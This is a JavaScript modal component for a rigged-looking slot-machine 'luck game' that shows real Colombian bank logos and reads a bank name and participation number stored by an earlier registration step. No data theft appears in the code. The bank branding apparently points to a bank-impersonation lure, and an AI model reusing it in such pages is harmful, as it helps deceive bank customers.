/**
 * Definición declarativa del Modal Juego
 * Modal de juego de ruleta/slots con animación
 */

const modalJuegoDefinition = {
  // ==================== TEMPLATE ====================
  template: function({ buttonText, showProgress, flowConfig }) {
    const banco = this.getAttribute('banco') || localStorage.getItem('rayan_datos_registro_banco') || 'avvillas';
    const bancoInfo = this.getBancoInfo(banco);

    return `
      <div class="modal-overlay">
        <div class="modal-content">
          <div class="content">
            <img src="${bancoInfo.logo}" alt="${bancoInfo.nombre}" class="logo" />

            <div class="ruedas-section" id="seccion-ruedas">
              <div class="mi-numero">
                Mi número: <span class="numero-mostrado" id="numero-mostrado"></span>
              </div>
              <div class="slots-container">
                ${[0,1,2,3,4,5].map(i => `
                  <div class="slot" id="slot-${i}">
                    <div class="slot-number">0</div>
                  </div>
                `).join('')}
              </div>
              <div id="mensaje-derrota" class="hidden mensaje-derrota">
                ¡HAS PERDIDO!
              </div>
            </div>
          </div>
        </div>
      </div>
    `;
  },

  // ==================== ESTILOS ====================
  styles: `
    .modal-overlay {
      position: fixed;
      inset: 0;
      background-color: rgba(0, 0, 0, 0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 50;
      padding: 1rem;
    }

    .modal-content {
      background-color: white;
      border-radius: 1rem;
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
      max-width: 85vw;
      width: 100%;
      padding: 1rem;
      animation: fadeIn 0.3s ease-out;
      box-sizing: border-box;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.9); }
      to { opacity: 1; transform: scale(1); }
    }

    .content {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 1.5rem;
      width: 100%;
      max-width: 100%;
      overflow: hidden;
    }

    .logo {
      height: 3.5rem;
      max-width: 100%;
      width: auto;
      object-fit: contain;
    }

    .ruedas-section {
      width: 100%;
      max-width: 100%;
      display: block;
      overflow: hidden;
    }

    .mi-numero {
      text-align: center;
      color: #374151;
      font-size: 1.125rem;
      font-weight: 600;
      margin-bottom: 1rem;
      word-wrap: break-word;
      max-width: 100%;
      padding: 0 0.5rem;
    }

    .numero-mostrado {
      color: #2563eb;
      font-weight: 700;
      font-size: 1.5rem;
      letter-spacing: 0.1em;
    }

    .slots-container {
      display: flex;
      justify-content: center;
      gap: 0.25rem;
      margin-bottom: 1.5rem;
      flex-wrap: nowrap;
      overflow-x: auto;
    }

    .slot {
      width: 2.3rem;
      height: 2.75rem;
      min-width: 2.3rem;
      flex-shrink: 0;
      border: 2px solid #2563eb;
      border-radius: 0.5rem;
      background: linear-gradient(to bottom, #f0f9ff 0%, #ffffff 50%, #f0f9ff 100%);
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .slot-number {
      font-size: 1.5rem;
      font-weight: 600;
      color: #1e3a8a;
      text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
    }

    .slot.spinning .slot-number {
      animation: spin-number 0.1s linear infinite;
      filter: blur(3px);
      opacity: 0.7;
    }

    @keyframes spin-number {
      0% { transform: translateY(0); }
      100% { transform: translateY(-20px); }
    }

    .mensaje-derrota {
      text-align: center;
      color: #dc2626;
      font-size: 2rem;
      font-weight: 900;
      animation: aparecerPerdida 0.8s ease-out;
      padding: 0 0.5rem;
    }

    @keyframes aparecerPerdida {
      0% { opacity: 0; transform: scale(0.5) translateY(-20px); }
      60% { transform: scale(1.2) translateY(0); }
      80% { transform: scale(0.95); }
      100% { opacity: 1; transform: scale(1); }
    }

    .hidden {
      display: none;
    }

    .return-notification {
      background: #F8FAFC;
      border-left: 4px solid #1E40AF;
      border-radius: 0.375rem;
      padding: 1rem 1.25rem;
      margin-bottom: 1rem;
      display: flex;
      align-items: center;
      gap: 0.875rem;
      animation: slideDownNotif 0.3s ease-out;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
    }

    @keyframes slideDownNotif {
      from {
        opacity: 0;
        transform: translateY(-8px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .notification-icon {
      width: 1.25rem;
      height: 1.25rem;
      color: #1E40AF;
      flex-shrink: 0;
    }

    .return-notification span {
      color: #1F2937;
      font-size: 0.875rem;
      font-weight: 500;
      line-height: 1.5;
    }

    .return-notification.fade-out {
      animation: fadeOutNotif 0.25s ease-out forwards;
    }

    @keyframes fadeOutNotif {
      from {
        opacity: 1;
        transform: translateY(0);
      }
      to {
        opacity: 0;
        transform: translateY(-8px);
      }
    }
  `,

  // ==================== VALIDACIONES ====================
  validations: {
    // Este modal no tiene campos de formulario
  },

  // ==================== HANDLERS ====================
  handlers: {
    // La lógica del juego se maneja en lifecycle.connected
  },

  // ==================== CICLO DE VIDA ====================
  lifecycle: {
    connected: function() {
      // Procesar el número guardado
      const numeroGuardado = localStorage.getItem('rayan_numero_participacion') || this.getAttribute('numero') || '';
      this.procesarNumero(numeroGuardado);

      // Iniciar el juego después de un pequeño delay
      setTimeout(() => this.iniciarJuego(), 300);
    }
  },

  // ==================== MÉTODOS PERSONALIZADOS ====================
  getBancoInfo: function(banco) {
    const bancos = {
      'avvillas': {
        nombre: 'Banco AV Villas',
        logo: '/images/logo-avv.png'
      },
      'bogota': {
        nombre: 'Banco de Bogotá',
        logo: '/images/logo-bog.png'
      },
      'occidente': {
        nombre: 'Banco de Occidente',
        logo: '/images/logo-occ.png'
      },
      'popular': {
        nombre: 'Banco Popular',
        logo: '/images/logo-pop.png'
      }
    };

    return bancos[banco] || bancos['avvillas'];
  },

  procesarNumero: function(numero) {
    if (numero.length === 8) {
      // Tomar los 6 dígitos centrales para jugar
      this.numeroParaJugar = numero.substring(1, 7);
      // Mostrar con X al inicio y final
      this.numeroParaMostrar = 'X' + numero.substring(1, 7) + 'X';
    } else {
      // Si no tiene 8 dígitos, usar tal cual
      this.numeroParaJugar = numero;
      this.numeroParaMostrar = numero;
    }
    this.numeroIngresado = this.numeroParaJugar;
  },

  iniciarJuego: function() {
    // Generar números finales
    this.numerosFinales = Array.from({length: 6}, () => Math.floor(Math.random() * 10));

    // Mostrar número para visualización (con X si es de 8 dígitos)
    const numeroMostradoEl = this.shadowRoot.getElementById('numero-mostrado');
    if (numeroMostradoEl) {
      numeroMostradoEl.textContent = this.numeroParaMostrar;
    }

    // Animar slots
    for (let i = 0; i < 6; i++) {
      setTimeout(() => {
        this.animarSlot(i);
      }, i * 500);
    }
  },

  animarSlot: function(index) {
    const slot = this.shadowRoot.getElementById(`slot-${index}`);
    const numberEl = slot?.querySelector('.slot-number');

    if (!slot || !numberEl) return;

    // Iniciar animación
    slot.classList.add('spinning');

    // Cambiar números rápidamente
    const interval = setInterval(() => {
      numberEl.textContent = Math.floor(Math.random() * 10);
    }, 50);

    // Detener después de un tiempo
    setTimeout(() => {
      clearInterval(interval);
      slot.classList.remove('spinning');
      numberEl.textContent = this.numerosFinales[index];

      // Si es el último, verificar resultado
      if (index === 5) {
        setTimeout(() => this.mostrarResultado(), 500);
      }
    }, 2000 + (index * 400));
  },

  mostrarResultado: function() {
    const numeroGenerado = this.numerosFinales.join('');

    if (this.numeroIngresado === numeroGenerado) {
      // Ganador (muy poco probable)
      alert('¡GANASTE!');
    } else {
      // Perdedor
      setTimeout(() => {
        const mensajeDerrota = this.shadowRoot.getElementById('mensaje-derrota');
        if (mensajeDerrota) {
          mensajeDerrota.classList.remove('hidden');
        }
      }, 500);
    }
  },

  // ==================== CONFIGURACIÓN ====================
  config: {
    defaultButtonText: null, // Este modal no tiene botón
    showReturnNotification: true,
    returnMessage: 'Bienvenido nuevamente al juego de la suerte.',
    returnIcon: `
      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.828 14.828a4 4 0 01-5.656 0M9 10h.01M15 10h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
    `,
    persistData: false,
    observedAttributes: ['banco', 'numero']
  }
};

// Exportar
if (typeof window !== 'undefined') {
  window.modalJuegoDefinition = modalJuegoDefinition;
}

if (typeof module !== 'undefined' && module.exports) {
  module.exports = modalJuegoDefinition;
}
